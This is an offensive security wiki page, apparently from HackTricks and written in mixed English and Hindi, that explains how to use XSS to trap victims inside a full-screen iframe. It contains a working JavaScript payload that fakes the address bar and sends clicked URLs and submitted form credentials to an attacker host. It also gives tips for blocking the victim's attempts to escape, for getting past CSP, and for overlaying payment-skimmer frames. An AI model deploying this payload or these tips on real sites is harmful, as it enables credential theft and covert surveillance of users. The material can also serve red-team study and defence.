# Iframe Traps

{{#include ../banners/hacktricks-training.md}}

## Basic Information

This form of abusing XSS via iframes to steal information from the user moving across the web page was originally published in these 2 post from trustedsec.com: [**here**](https://trustedsec.com/blog/persisting-xss-with-iframe-traps) **and** [**here**](https://trustedsec.com/blog/js-tap-weaponizing-javascript-for-red-teams).

यह तरीका XSS का दुरुपयोग करके iframes के माध्यम से वेब पेज पर घूमते हुए उपयोगकर्ता से जानकारी चुराने का है और यह मूल रूप से trustedsec.com पर इन 2 पोस्ट में प्रकाशित हुआ था: [**here**](https://trustedsec.com/blog/persisting-xss-with-iframe-traps) **and** [**here**](https://trustedsec.com/blog/js-tap-weaponizing-javascript-for-red-teams).

The attack start in a page vulnerable to a XSS where it’s possible to make the **victims don’t leave the XSS** by making them **navigate within an iframe** that occupies all the web application.

यह हमला एक ऐसे पेज से शुरू होता है जो XSS के लिए vulnerable है, जहाँ यह संभव होता है कि आप **victims don’t leave the XSS** के हालात बना दें — यानी उन्हें पूरी web application पर काबिज एक **iframe के भीतर navigate within an iframe** करवा दें।

The XSS attack will basically load the web page in an iframe in 100% of the screen. Therefore, the victim **won't notice he is inside an iframe**. Then, if the victim navigates in the page by clicking links inside the iframe (inside the web), he will be **navigating inside the iframe** with the arbitrary JS loaded stealing information from this navigation.

XSS attack मूलतः वेब पेज को स्क्रीन के 100% पर एक iframe में लोड कर देता है। इसलिए, victim **won't notice he is inside an iframe**। फिर, यदि victim iframe के अंदर के links पर क्लिक करके पेज पर navigate करता है (वेब के अंदर), तो वह लोड किए गए arbitrary JS के साथ **navigating inside the iframe** होगा जो उस navigation से जानकारी चुरा लेगा।

Moreover, to make it more realistic, it’s possible to use some **listeners** to check when an iframe changes the location of the page, and update the URL of the browser with that locations the user things he’s is moving pages using the browser.

और अधिक रियलिस्टिक बनाने के लिए, कुछ **listeners** का इस्तेमाल करके देखा जा सकता है कि कब iframe पेज का location बदलता है, और ब्राउज़र का URL उस location के साथ अपडेट किया जा सकता है ताकि उपयोगकर्ता सोचे कि वह ब्राउज़र का उपयोग करके पेज बदल रहा है।

<figure><img src="../images/image (1248).png" alt=""><figcaption><p><a href="https://www.trustedsec.com/wp-content/uploads/2022/04/regEvents.png">https://www.trustedsec.com/wp-content/uploads/2022/04/regEvents.png</a></p></figcaption></figure>

<figure><img src="../images/image (1249).png" alt=""><figcaption><p><a href="https://www.trustedsec.com/wp-content/uploads/2022/04/fakeAddress-1.png">https://www.trustedsec.com/wp-content/uploads/2022/04/fakeAddress-1.png</a></p></figcaption></figure>

Moreover, it's possible to use listeners to steal sensitive information, not only the other pages the victim is visiting, but also the data used to **filled forms** and send them (credentials?) or to **steal the local storage**...

इसके अलावा, listeners का उपयोग करके संवेदनशील जानकारी भी चुराई जा सकती है — न सिर्फ़ वे अन्य पेज जो victim देख रहा है, बल्कि उन data को भी जो **filled forms** में उपयोग किए जा रहे हैं और उन्हें भेजा जा सकता है (credentials?) या **steal the local storage** किया जा सकता है...

Ofc, the main limitations are that a **victim closing the tab or putting another URL in the browser will escape the iframe**. Another way to do this would be to **refresh the page**, however, this could be partially **prevented** by disabling the right click context menu every time a new page is loaded inside the iframe or noticing when the mouse of the user leaves the iframe, potentially to click the reload button of the browser and in this case the URL of the browser is updated with the original URL vulnerable to XSS so if the user reloads it, it will get poisoned again (note that this is not very stealth).

बेशक, मुख्य सीमाएँ यह हैं कि अगर कोई **victim closing the tab or putting another URL in the browser will escape the iframe**। इसका दूसरा तरीका यह होगा कि वह **refresh the page** कर दे; हालाँकि इसे आंशिक रूप से **prevented** किया जा सकता है — हर बार जब iframe के अंदर नया पेज लोड हो तो right click context menu डिसेबल करके, या जब उपयोगकर्ता का mouse iframe छोड़ता है तो पहचान कर (जो संभवतः ब्राउज़र के reload बटन पर क्लिक करने के लिए हो), और इस स्थिति में ब्राउज़र का URL उस original URL से अपडेट हो जाता है जो XSS के लिए vulnerable था, तो अगर user उसे reload करता है तो वह फिर से संक्रमित हो जाएगा (ध्यान दें कि यह बहुत stealthy नहीं है)।

## Modernised trap (2024+)

* Use a **full‑viewport iframe** plus History/Navigation API to mimic real navigation.

<details>
<summary>Full-viewport iframe trap</summary>
```html
<script>
const i=document.createElement('iframe');
i.src=location.href;
i.style='position:fixed;inset:0;border:0;width:100vw;height:100vh;z-index:999999;background:#fff';
document.body.appendChild(i);
function sync(url){history.replaceState({},'',url);}
i.addEventListener('load',()=>{
const w=i.contentWindow;
['hashchange','popstate'].forEach(ev=>w.addEventListener(ev,()=>sync(w.location.href)));
w.addEventListener('click',()=>fetch('//attacker/log',{method:'POST',body:w.location.href}));
w.document.addEventListener('submit',ev=>{
const fd=new FormData(ev.target);
fetch('//attacker/creds',{method:'POST',body:new URLSearchParams(fd)});
},true);
});
</script>
```
</details>

* **Navigation API** (`navigation.navigate`, `currententrychange`) बाहरी URL बार को सिंक में रखता है, वास्तविक URL leaking नहीं होता।
* Go **fullscreen** करके browser UI छिपाएँ और अपना नकली address bar/padlock बनाकर दिखाएँ।

## Overlay & skimmer usage

* Compromised merchants hosted payment iframes (Stripe, Adyen, etc.) को **pixel‑perfect overlay** से replace कर देते हैं जो keystrokes forward करता है जबकि असली frame नीचे रहता है; कभी‑कभी legacy validation APIs का इस्तेमाल किया जाता है ताकि flow कभी टूटे नहीं।
* Top frame में users को trap करने से **autofill/password‑manager** डेटा पकड़ा जा सकता है इससे पहले कि वे नोटिस करें कि URL बार कभी बदलना ही नहीं था।

## Evasion tricks observed in 2025 research

* `about:blank`/`data:` local frames parent origin inherit करते हैं और कुछ content‑blocker heuristics को bypass करते हैं; nested iframes respawn कर सकती हैं यहां तक कि जब extensions third‑party frames को tear down कर देते हैं।
* **Permission propagation**: parent `allow` attribute को rewrite करने से nested attacker frames को fullscreen/camera/microphone मिल सकते हैं बिना स्पष्ट DOM परिवर्तन के।

## Quick OPSEC tips

* जब mouse बाहर जाए तो iframe को re‑focus करें (`mouseleave` on body) ताकि users browser UI तक न पहुँच पाएं।
* context menu और सामान्य shortcuts disable करें (`keydown` for `F11`, `Ctrl+L`, `Ctrl+T`) फ्रेम के अंदर ताकि escape कोशिशें धीमी पड़ें।
* अगर CSP inline scripts block कर रहा है, तो एक remote bootstrapper inject करें और iframe पर `srcdoc` enable करें ताकि आपका payload मुख्य पेज की enforced CSP से बाहर रहे।

## Related

{{#ref}}
clickjacking.md
{{#endref}}



## References

- [Iframe security exposed: blind spot fueling payment skimmer attacks (2025)](https://thehackernews.com/2025/09/iframe-security-exposed-blind-spot.html)
- [Local Frames: exploiting inherited origins to bypass blockers (2025)](https://arxiv.org/abs/2506.00317)
{{#include ../banners/hacktricks-training.md}}
